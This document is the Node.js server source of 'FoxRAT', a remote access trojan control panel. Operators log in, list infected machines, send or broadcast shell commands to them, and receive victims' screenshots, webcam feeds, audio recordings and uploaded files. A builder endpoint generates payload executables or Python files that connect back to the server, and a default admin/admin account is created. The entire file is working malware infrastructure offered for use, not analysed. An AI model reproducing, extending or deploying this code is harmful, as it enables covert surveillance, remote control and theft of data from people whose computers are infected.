const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public'), { maxAge: 0, etag: false }));
app.use((req, res, next) => { res.set('Cache-Control', 'no-store, no-cache, must-revalidate'); next(); });

// ===== Data directories =====
const dataDir = path.join(__dirname, 'data');
fs.mkdirSync(dataDir, { recursive: true });
const filesDir = path.join(__dirname, 'files');
fs.mkdirSync(filesDir, { recursive: true });

// ===== Account & client storage =====
const accountsFile = path.join(dataDir, 'accounts.json');
const clientsFile = path.join(dataDir, 'clients.json');

function loadJSON(file, def) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return def; }
}
function saveJSON(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

let accounts = loadJSON(accountsFile, {});
let savedClients = loadJSON(clientsFile, {});

function saveAccounts() { saveJSON(accountsFile, accounts); }
function saveClients() { saveJSON(clientsFile, savedClients); }

// ===== Password hashing =====
function hashPass(pass) {
    const salt = crypto.randomBytes(16).toString('hex');
    const hash = crypto.pbkdf2Sync(pass, salt, 10000, 64, 'sha512').toString('hex');
    return salt + ':' + hash;
}
function checkPass(pass, stored) {
    const [salt, hash] = stored.split(':');
    const check = crypto.pbkdf2Sync(pass, salt, 10000, 64, 'sha512').toString('hex');
    return hash === check;
}

// ===== Session tokens =====
const sessions = new Map(); // token -> { account, createdAt }

function authMiddleware(req, res, next) {
    const token = req.headers['x-session-token'];
    if (!token || !sessions.has(token)) return res.status(401).json({ error: 'Unauthorized' });
    req.account = sessions.get(token).account;
    next();
}

// ===== Auth endpoints =====
app.post('/api/register', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
    if (username.length < 3) return res.status(400).json({ error: 'Username min 3 chars' });
    if (password.length < 4) return res.status(400).json({ error: 'Password min 4 chars' });
    if (accounts[username]) return res.status(409).json({ error: 'Account exists' });

    accounts[username] = { password: hashPass(password), created: Date.now() };
    savedClients[username] = [];
    saveAccounts();
    saveClients();

    const token = crypto.randomBytes(24).toString('hex');
    sessions.set(token, { account: username, createdAt: Date.now() });
    console.log(`[Account] Registered: ${username}`);
    res.json({ ok: true, token, username });
});

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password required' });

    const acc = accounts[username];
    if (!acc) return res.status(403).json({ error: 'Account not found' });
    if (!checkPass(password, acc.password)) return res.status(403).json({ error: 'Wrong password' });

    const token = crypto.randomBytes(24).toString('hex');
    sessions.set(token, { account: username, createdAt: Date.now() });
    console.log(`[Account] Login: ${username}`);
    res.json({ ok: true, token, username });
});

app.post('/api/logout', (req, res) => {
    const token = req.headers['x-session-token'];
    if (token) sessions.delete(token);
    res.json({ ok: true });
});

// ===== Per-account clients =====
const liveClients = new Map(); // clientId -> { ws, ip, info, account, connectedAt }

app.get('/api/clients', authMiddleware, (req, res) => {
    const acc = req.account;
    const saved = savedClients[acc] || [];
    const live = Array.from(liveClients.values())
        .filter(c => c.account === acc)
        .map(c => ({ id: c.id, ip: c.ip, info: c.info, connectedAt: c.connectedAt, online: true }));

    const allIds = new Set(live.map(c => c.id));
    const offline = saved.filter(c => !allIds.has(c.id)).map(c => ({ ...c, online: false }));

    res.json([...live, ...offline]);
});

app.post('/api/command', authMiddleware, (req, res) => {
    const { clientId, command } = req.body;
    const client = liveClients.get(clientId);
    if (!client || client.account !== req.account) return res.status(404).json({ error: 'Client not found' });
    client.ws.send(JSON.stringify({ type: 'command', cmd: command.cmd, seq: command.seq || '' }));
    res.json({ ok: true });
});

app.post('/api/broadcast', authMiddleware, (req, res) => {
    const { command } = req.body;
    const msg = JSON.stringify({ type: 'command', cmd: command.cmd, seq: command.seq || '' });
    let count = 0;
    liveClients.forEach(c => {
        if (c.account === req.account && c.ws.readyState === WebSocket.OPEN) {
            c.ws.send(msg);
            count++;
        }
    });
    res.json({ ok: true, count });
});

app.get('/api/builder-info', (req, res) => {
    const host = req.headers.host || 'localhost:3000';
    res.json({ server: host, version: '0.26.0' });
});

// ===== File management =====
app.post('/api/upload', authMiddleware, (req, res) => {
    const { clientId, fileName, data } = req.body;
    if (!clientId || !fileName || !data) return res.status(400).json({ error: 'Missing fields' });
    const dir = path.join(filesDir, req.account, clientId);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, fileName), Buffer.from(data, 'base64'));
    res.json({ ok: true });
});

app.get('/api/files/:clientId', authMiddleware, (req, res) => {
    const dir = path.join(filesDir, req.account, req.params.clientId);
    if (!fs.existsSync(dir)) return res.json([]);
    const items = fs.readdirSync(dir).map(f => {
        const s = fs.statSync(path.join(dir, f));
        return { name: f, size: s.size, time: s.mtimeMs };
    });
    res.json(items);
});

app.get('/api/download/:clientId/:file', authMiddleware, (req, res) => {
    const fp = path.join(filesDir, req.account, req.params.clientId, path.basename(req.params.file));
    if (!fs.existsSync(fp)) return res.status(404).end();
    res.download(fp);
});

app.post('/api/delete-file', authMiddleware, (req, res) => {
    const { clientId, file } = req.body;
    const fp = path.join(filesDir, req.account, clientId, path.basename(file));
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
    res.json({ ok: true });
});

// ===== Builder endpoint =====
const downloadsDir = path.join(__dirname, 'downloads');
fs.mkdirSync(downloadsDir, { recursive: true });
setInterval(() => {
    fs.readdir(downloadsDir, (_, files) => {
        for (const f of files) {
            const fp = path.join(downloadsDir, f);
            try { if (Date.now() - fs.statSync(fp).mtimeMs > 300000) fs.unlinkSync(fp); } catch(_) {}
        }
    });
}, 300000);

let builder = null;
try { builder = require('./server_build'); } catch(_) { console.log('[Builder] Not available'); }
app.post('/build', authMiddleware, express.json({ limit: '50mb' }), async (req, res) => {
    if (!builder) return res.status(503).json({ error: 'Builder not available' });
    try {
        const opts = { ...req.body, host: req.hostname === '0.0.0.0' ? '127.0.0.1' : req.hostname, port: PORT };
        const result = builder.build(opts);
        const safeName = (req.body.filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';
        const dlId = crypto.randomBytes(8).toString('hex');
        const ext = result.ext || '.exe';
        const dlPath = path.join(downloadsDir, dlId + ext);
        fs.writeFileSync(dlPath, result.data);
        res.json({ ok: true, downloadUrl: '/dl/' + dlId + '?name=' + safeName + ext });
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/dl/:id', (req, res) => {
    const id = req.params.id;
    const fpExe = path.join(downloadsDir, id + '.exe');
    const fpPy = path.join(downloadsDir, id + '.py');
    let fp, defaultName;
    if (fs.existsSync(fpExe)) { fp = fpExe; defaultName = 'FoxRAT.exe'; }
    else if (fs.existsSync(fpPy)) { fp = fpPy; defaultName = 'FoxRAT.py'; }
    else return res.status(404).send('File not found or expired');
    const name = req.query.name || defaultName;
    res.download(fp, name);
});

// ===== WebSocket =====
wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress.replace('::ffff:', '');
    let clientId = null;
    let accountName = null;

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw);

            if (msg.type === 'panel_auth') {
                const token = msg.token;
                const session = token ? sessions.get(token) : null;
                if (!session) {
                    ws.send(JSON.stringify({ type: 'auth_error', error: 'Invalid session' }));
                    ws.close();
                    return;
                }
                ws._isPanel = true;
                ws._account = session.account;
                accountName = session.account;
                const list = getAccountClients(session.account);
                ws.send(JSON.stringify({ type: 'clients', list }));
                return;
            }

            if (msg.type === 'register') {
                clientId = msg.id || crypto.randomBytes(4).toString('hex');
                accountName = msg.account || 'default';
                const info = msg.info || {};

                if (!accounts[accountName]) {
                    ws.send(JSON.stringify({ type: 'error', error: 'Account not found' }));
                    ws.close();
                    return;
                }

                liveClients.set(clientId, { ws, ip, info, id: clientId, account: accountName, connectedAt: Date.now() });

                const clientData = { id: clientId, ip, info, connectedAt: Date.now() };
                savedClients[accountName] = savedClients[accountName] || [];
                const existing = savedClients[accountName].findIndex(c => c.id === clientId);
                const savedData = { id: clientId, ip, info, connectedAt: clientData.connectedAt };
                if (existing >= 0) savedClients[accountName][existing] = savedData;
                else savedClients[accountName].push(savedData);
                saveClients();

                broadcastToAccount(accountName, JSON.stringify({ type: 'clients', list: getAccountClients(accountName) }));
                broadcastToAccount(accountName, JSON.stringify({ type: 'user_connected', client: clientData }));
                ws.send(JSON.stringify({ type: 'registered', id: clientId }));
                console.log(`[Client] ${clientId} registered to account: ${accountName} (${ip})`);
                return;
            }

            if (msg.type === 'cmd_result') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'cmd_result', clientId, seq: msg.seq, output: msg.output }));
                return;
            }

            if (msg.type === 'screenshot') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'screenshot', clientId, data: msg.data, w: msg.w, h: msg.h }));
                return;
            }

            if (msg.type === 'audio_data') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'audio_data', clientId, data: msg.data, duration: msg.duration }));
                return;
            }

            if (msg.type === 'audio_stream') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'audio_stream', clientId, data: msg.data }));
                return;
            }

            if (msg.type === 'webcam_data') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'webcam_data', clientId, data: msg.data }));
                return;
            }

            if (msg.type === 'chat_message') {
                broadcastToAccount(accountName, JSON.stringify({ type: 'chat_message', clientId, from: msg.from, message: msg.message }));
                return;
            }
        } catch (_) {}
    });

    ws.on('close', () => {
        if (clientId && accountName) {
            const client = liveClients.get(clientId);
            broadcastToAccount(accountName, JSON.stringify({ type: 'user_disconnected', clientId, info: client ? client.info : {} }));
            liveClients.delete(clientId);
            broadcastToAccount(accountName, JSON.stringify({ type: 'clients', list: getAccountClients(accountName) }));
            console.log(`[Client] ${clientId} disconnected from ${accountName}`);
        }
    });
    ws.on('error', () => {});
});

function getAccountClients(account) {
    return Array.from(liveClients.values())
        .filter(c => c.account === account)
        .map(c => ({ id: c.id, ip: c.ip, info: c.info, connectedAt: c.connectedAt }));
}

function broadcastToAccount(account, data) {
    wss.clients.forEach(c => {
        if (c.readyState === WebSocket.OPEN && c._isPanel && c._account === account) {
            c.send(data);
        }
    });
}

// ===== Startup: register default admin =====
if (!accounts['admin']) {
    accounts['admin'] = { password: hashPass('admin'), created: Date.now() };
    savedClients['admin'] = [];
    saveAccounts();
    saveClients();
    console.log('[Account] Default account created: admin / admin');
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`[FoxRAT] Server on :${PORT}`));
